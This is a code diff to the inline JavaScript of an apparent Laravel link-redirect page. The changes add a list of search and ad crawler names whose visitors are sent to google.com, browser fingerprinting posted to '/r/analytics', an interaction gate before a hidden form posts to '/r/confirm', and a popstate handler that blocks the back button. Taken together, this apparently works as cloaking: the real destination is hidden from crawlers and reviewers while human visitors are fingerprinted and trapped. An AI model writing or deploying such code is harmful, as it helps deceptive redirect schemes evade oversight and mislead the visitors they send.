@@ -18,45 +18,33 @@
         }
     </script>
     <script>
-        localStorage.setItem("myCat", "Tom");
-        const cat = localStorage.getItem("myCat");
-
-        function submitForm(data, url) {
-            const form = document.createElement('form');
-            form.method = 'POST';
-            form.action = url;
-            form.style.display = 'none';
-
-            Object.entries(data).forEach(([key, value]) => {
-                const input = document.createElement('input');
-                input.type = 'hidden';
-                input.name = key;
-                input.value = value;
-                form.appendChild(input);
-            });
-
-            // CSRF token для Laravel
-            const token = document.createElement('input');
-            token.type = 'hidden';
-            token.name = '_token';
-            token.value = document.querySelector('meta[name="csrf-token"]')?.content || '';
-            form.appendChild(token);
-
-            document.body.appendChild(form);
-            form.submit();
-        }
-
-        const getCookie = (name) => {
-            const value = `; ${document.cookie}`;
-            const parts = value.split(`; ${name}=`);
-            if (parts.length === 2) return parts.pop().split(';').shift();
-        };
+        let metricsWereSent = false;
         let pageLoadTime = Date.now();
         let hasInteracted = false;
 
-        document.addEventListener('mousemove', () => hasInteracted = true);
-        document.addEventListener('touchstart', () => hasInteracted = true);
-        document.addEventListener('scroll', () => hasInteracted = true);
+        function showLoader(element) {
+            if (element.querySelector('.universal-loader')) return;
+
+            const originalContent = element.innerHTML;
+            element.dataset.originalContent = originalContent;
+
+            element.innerHTML = `
+                <div class="universal-loader inline-flex items-center">
+                    <svg class="animate-spin -ml-1 mr-3 h-5 w-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                    </svg>
+                    Processing...
+                </div>
+            `;
+        }
+
+        function hideLoader(element) {
+            if (element.dataset.originalContent) {
+                element.innerHTML = element.dataset.originalContent;
+                delete element.dataset.originalContent;
+            }
+        }
 
         function checkBrowserFeatures() {
             const features = {
@@ -99,10 +87,31 @@
             };
         };
 
+        function isValidUserAgent(ua) {
+            const botPatterns = [
+                'bot', 'spider', 'crawl', 'APIs-Google', 'AdsBot',
+                'Googlebot', 'mediapartners', 'Google Favicon',
+                'FeedFetcher', 'Google-Read-Aloud',
+                'DuplexWeb-Google', 'googleweblight',
+                'bing', 'yandex', 'baidu', 'slurp',
+                'duckduck', 'baiduspider', 'facebot',
+                'facebookexternalhit', 'ia_archiver'
+            ].some(bot => ua.toLowerCase().includes(bot));
+
+            if (botPatterns) return false;
+
+            const isMobile = /Mobile|Android|iPhone/i.test(ua);
+            const resolution = `${window.screen.width}x${window.screen.height}`;
+            if (isMobile && resolution.split('x')[0] === resolution.split('x')[1]) {
+                return false;
+            }
+
+            return true;
+        }
 
         async function sendMetricsToAnalytics() {
             try {
-                await fetch('/r/analytics', {
+                const response = await fetch('/r/analytics', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -110,43 +119,94 @@
                     },
                     body: JSON.stringify({
                         metrics: btoa(JSON.stringify(getMetrics())),
-                        uh: '{{ $user_unique_hash }}'
+                        uh: '{{ $user_unique_hash }}',
+                        fd: '{{ $first_data }}',
                     })
                 });
+
+                // Дожидаемся ответа и парсим его
+                const result = await response.json();
+
+                if (response.ok && result) {
+                    metricsWereSent = true;
+                    return true;
+                }
+                return false;
             } catch (e) {
                 console.error('Analytics error:', e);
+                return false;
             }
         }
 
         async function handleClick(event, element) {
             event.preventDefault();
-
-            const timeOnPage = Date.now() - pageLoadTime;
-            if (!hasInteracted || timeOnPage < 1000) {
-                return false;
-            }
+            showLoader(element);
 
             try {
-                const encodedResource = element.dataset.resource;
 
+                const metrics = getMetrics();
+                const ua = navigator.userAgent;
+
+                if (!metrics.features.hasWebGL || !isValidUserAgent(ua)) {
+                    window.location.href = 'https://www.google.com';
+                    return false;
+                }
+
+                const timeOnPage = Date.now() - pageLoadTime;
+                if (!hasInteracted || timeOnPage < 1000) {
+                    hideLoader(element);
+                    return false;
+                }
+
+                const encodedResource = element.dataset.resource;
                 const data = {
-                    'metrics': btoa(JSON.stringify(getMetrics())),
+                    'metrics': btoa(JSON.stringify(metrics)),
                     'url': encodedResource,
                     'uh': '{{ $user_unique_hash }}',
-                }
+                    'fd': '{{ $first_data }}',
+                };
+
                 window.history.pushState(null, '', '/');
                 window.onpopstate = function () {
                     window.history.pushState(null, '', '/');
                 };
-                submitForm(data, '/r/confirm');
-                //window.location.href = finalUrl;
+
+                // Создаем и отправляем форму только после успешной отправки аналитики
+                const form = document.createElement('form');
+                form.method = 'POST';
+                form.action = '/r/confirm';
+                form.style.display = 'none';
+
+                Object.entries(data).forEach(([key, value]) => {
+                    const input = document.createElement('input');
+                    input.type = 'hidden';
+                    input.name = key;
+                    input.value = value;
+                    form.appendChild(input);
+                });
+
+                const token = document.createElement('input');
+                token.type = 'hidden';
+                token.name = '_token';
+                token.value = document.querySelector('meta[name="csrf-token"]')?.content || '';
+                form.appendChild(token);
+
+                document.body.appendChild(form);
+                form.submit();
+
             } catch (e) {
+                console.error('Error:', e);
+                hideLoader(element);
                 return false;
             }
         }
 
+        document.addEventListener('mousemove', () => hasInteracted = true);
+        document.addEventListener('touchstart', () => hasInteracted = true);
+        document.addEventListener('scroll', () => hasInteracted = true);
+
         document.addEventListener('DOMContentLoaded', async () => {
-            await sendMetricsToAnalytics();
+            metricsWereSent = await sendMetricsToAnalytics();
             document.querySelectorAll('[data-resource]').forEach(element => {
                 element.style.cursor = 'pointer';
                 element.addEventListener('click', (e) => handleClick(e, element));
@@ -165,6 +225,19 @@
         to {
             opacity: 1;
             transform: translateY(0);
+        }
+    }
+
+    .universal-loader {
+        animation: fadeIn 0.3s ease-out forwards;
+    }
+
+    @keyframes spin {
+        from {
+            transform: rotate(0deg);
+        }
+        to {
+            transform: rotate(360deg);
         }
     }
 </style>
